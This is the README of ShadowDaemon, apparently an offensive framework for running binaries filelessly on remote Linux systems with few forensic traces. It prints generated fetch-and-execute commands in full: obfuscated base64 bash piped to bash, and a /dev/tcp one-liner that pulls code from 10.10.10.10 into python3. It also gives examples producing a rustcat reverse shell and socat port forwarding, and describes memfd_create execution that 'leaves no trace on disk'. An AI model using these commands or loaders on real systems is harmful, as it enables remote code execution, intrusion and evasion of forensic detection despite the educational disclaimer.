# ShadowDaemon

> [!WARNING]
> This tool is created for educational purposes. As such, it does not include any further obfuscation of executed files.
>
> Misuse of this tool on unauthorized systems is illegal and unethical.

A framework for secure, low-footprint binary execution on remote Linux systems. ShadowDaemon provides methods for executing binaries with minimal forensic artifacts through fileless execution techniques and template-based command generation.

## Table of Contents
- [ShadowDaemon](#shadowdaemon)
  - [Table of Contents](#table-of-contents)
  - [Features](#features)
  - [Components](#components)
  - [Usage](#usage)
    - [Server](#server)
    - [Fetcher](#fetcher)
      - [Practical Examples](#practical-examples)
  - [Technical Details](#technical-details)
  - [Template System](#template-system)
    - [Fetchers](#fetchers)
    - [Loaders](#loaders)
  - [Troubleshooting](#troubleshooting)
  - [ToDo](#todo)

## Features
- **Fileless Execution**: Execute binaries directly from memory using memfd_create
- **Minimal Artifacts**: Immediate cleanup of any temporary files
- **Template-Based Commands**: Generate commands using customizable templates
- ~~**Multi-Architecture Support**: Works across x86_64, i386, ARM, and ARM64~~ (untested)
- **Flexible Deployment**: HTTP-based binary delivery with custom arguments
- **Execution Tracking**: Monitor binary execution with built-in logging

## Components
- **Server**: HTTP server for distributing binaries and loaders
- **Loader**: Python script for fetching and executing binaries
- **Fetcher**: Command generator for creating deployment commands
- **Templates**: JSON-based template system for command customization

## Usage

### Server

```txt
usage: server.py [-h] [--host HOST] [--port PORT] [--debug] [--loader LOADER]
                 [--bin-dir BIN_DIR] [--log LOG]

Simple binary loader server

options:
  -h, --help         show this help message and exit
  --host HOST        Host to listen on
  --port PORT        Port to listen on
  --debug            Enable debug mode
  --loader LOADER    Path to the loader script
  --bin-dir BIN_DIR  Directory to serve binaries from
  --log LOG          Log file path
```

**Example:**
```sh
python server.py --bin-dir /path/to/binaries --port 8080 --loader loaders/loader.py --log server.log
```

### Fetcher

```
usage: fetcher.py generate [-h] [-a ARGS] [-d] [-T TEMPLATE_FILE] template server binary

positional arguments:
  template              Template to use for generating the command
  server                Server URL to fetch binary from
  binary                Binary to fetch from the server

options:
  -h, --help            show this help message and exit
  -a ARGS, --args ARGS  Arguments to pass to the binary
  -d, --decode          Print decoded command (for debugging)
  -T TEMPLATE_FILE, --template-file TEMPLATE_FILE
                        Path to fetchers template file
```

**Example:**

Generate fetcher using `bash` as a template:

```sh
python3 fetcher.py generate bash 10.10.10.10 echo -a '"hello world"' -T templates.json
```

```txt
[Option 1]
echo IyEvYmluL2Jhc2gKZXhlYyAzPD4vZGV2L3RjcC8xMC4xMC4xMC4xMC84MAplY2hvIC1uZSAiUE9TVCAvZWNobyBIVFRQLzEuMVxyXG4iID4mMwplY2hvIC1uZSAiSG9zdDogMTAuMTAuMTAuMTA6ODBcclxuIiA+JjMKZWNobyAtbmUgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbiIgPiYzCmVjaG8gLW5lICJDb250ZW50LUxlbmd0aDogMjJcclxuIiA+JjMKZWNobyAtbmUgIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iID4mMwplY2hvIC1uZSAiYXJncz0lMjJoZWxsbyt3b3JsZCUyMiIgPiYzCndoaWxlIElGUz0gcmVhZCAtciBsaW5lOyBkbwogICAgbGluZT0kKGVjaG8gIiRsaW5lIiB8IHRyIC1kICdccicpCiAgICBbIC16ICIkbGluZSIgXSAmJiBicmVhawpkb25lIDwmMwpjYXQgPCYzIHwgcHl0aG9uMwpleGVjIDM+Ji0= | base64 -d | bash

[Option 2]
base64 -d <<< IyEvYmluL2Jhc2gKZXhlYyAzPD4vZGV2L3RjcC8xMC4xMC4xMC4xMC84MAplY2hvIC1uZSAiUE9TVCAvZWNobyBIVFRQLzEuMVxyXG4iID4mMwplY2hvIC1uZSAiSG9zdDogMTAuMTAuMTAuMTA6ODBcclxuIiA+JjMKZWNobyAtbmUgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkXHJcbiIgPiYzCmVjaG8gLW5lICJDb250ZW50LUxlbmd0aDogMjJcclxuIiA+JjMKZWNobyAtbmUgIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iID4mMwplY2hvIC1uZSAiYXJncz0lMjJoZWxsbyt3b3JsZCUyMiIgPiYzCndoaWxlIElGUz0gcmVhZCAtciBsaW5lOyBkbwogICAgbGluZT0kKGVjaG8gIiRsaW5lIiB8IHRyIC1kICdccicpCiAgICBbIC16ICIkbGluZSIgXSAmJiBicmVhawpkb25lIDwmMwpjYXQgPCYzIHwgcHl0aG9uMwpleGVjIDM+Ji0= | bash

[Option 3]
exec 3<>/dev/tcp/10.10.10.10/80; echo -ne "POST /echo HTTP/1.1\r\n" >&3; echo -ne "Host: 10.10.10.10:80\r\n" >&3; echo -ne "Content-Type: application/x-www-form-urlencoded\r\n" >&3; echo -ne "Content-Length: 22\r\n" >&3; echo -ne "Connection: close\r\n\r\n" >&3; echo -ne "args=%22hello+world%22" >&3; while IFS= read -r line; do; line=$(echo "$line" | tr -d '\r'); [ -z "$line" ] && break; done <&3; cat <&3 | python3; exec 3>&-
```

#### Practical Examples

**Revshell with rustcat**

```sh
python3 fetcher.py generate bash 172.17.0.1:8000 rcat -a 'connect -s bash 172.17.0.1 4444'
```

**Port forwarding with socat**

```sh
python3 fetcher.py generate bash 172.17.0.1:8000 socat -a 'TCP4-LISTEN:5000,reuseaddr,fork TCP4:172.17.0.1:8000'
```

## Technical Details

1. Execution via `memfd_create`:
    - Creates memory-based file descriptor
    - Writes binary payload to memory
    - Executes directly from /dev/fd/{fd}
    - Leaves no trace on disk

2. Execute via `mktemp`:
    - Writes binary to a temporary location
    - Sets executable permission
    - Executes the file and immediately deletes it
    - Cleanup happens while binary is running


## Template System

### Fetchers

Fetcher template system uses JSON object containing command templates with placeholders:

- `{{HOST}}` - Target server hostname
- `{{PORT}}` - Server port
- `{{PATH}}` - Binary path
- `{{DATA}}` - Arguments as encoded form data
- `{{CONTENT_LENGTH}}` - Length of POST data

### Loaders

Loader template system is achieved by using `string.Template` to replace placeholders:

- `${HOST}` - Target server address (Derived from `Host` header on initial client request.)
- `${PATH}` - Binary to download and execute
- `${ARGS}` - Arguments to pass to the binary on execution

## Troubleshooting

**Common Issues**

1. **Connection Errors**
    - Ensure server is running and accessible from target
    - Check firewall settings and port accessibility
2. **Execution Failures**
    - Verify binary permissions and architecture compatibility
    - Check server logs for error information
3. **Template Errors**
    - Validate JSON template syntax
    - Ensure all required fields are present

## ToDo

- [ ] Add more templates
- [ ] Add HTTP(S) support to templates
- [ ] Add HTTP(S) support to `loader.py`
- [ ] Create web UI